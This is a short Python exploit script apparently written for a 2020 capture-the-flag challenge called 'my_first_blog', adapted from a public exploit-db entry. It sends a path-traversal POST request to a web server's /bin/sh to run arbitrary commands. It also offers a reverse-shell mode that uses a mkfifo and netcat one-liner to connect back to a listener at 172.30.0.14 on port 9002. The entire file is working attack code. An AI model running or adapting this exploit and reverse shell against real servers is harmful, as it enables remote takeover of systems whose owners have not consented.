''' tamuctf 26/03/2020 my_first_blog
'''

import sys
import socket

''' remote code execution
    original code https://www.exploit-db.com/exploits/47837
'''

def connect(soc):
    response = ""
    try:
        while True:
            connection = soc.recv(1024)
            if len(connection) == 0:
                break
            response += connection
    except:
        pass
    return response

def cve(target, port, cmd):
    soc = socket.socket()
    soc.connect((target, int(port)))
    payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1'.format(cmd)
    soc.send(payload)
    receive = connect(soc)
    print(receive)

if __name__ == "__main__":


    try:
        if(sys.argv[1] == "--reverse-shell" or sys.argv[1] == '-R'):
            cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.30.0.14 9002>/tmp/f"
        else:
            cmd = sys.argv[1]
        print("=== RESULT - %s ===\n" % cmd) 
        cve("172.30.0.2", 80, cmd)
   
    except IndexError:
        print("python my-first-blog_expl0it.py [-R][--reverse-shell][bash command]")
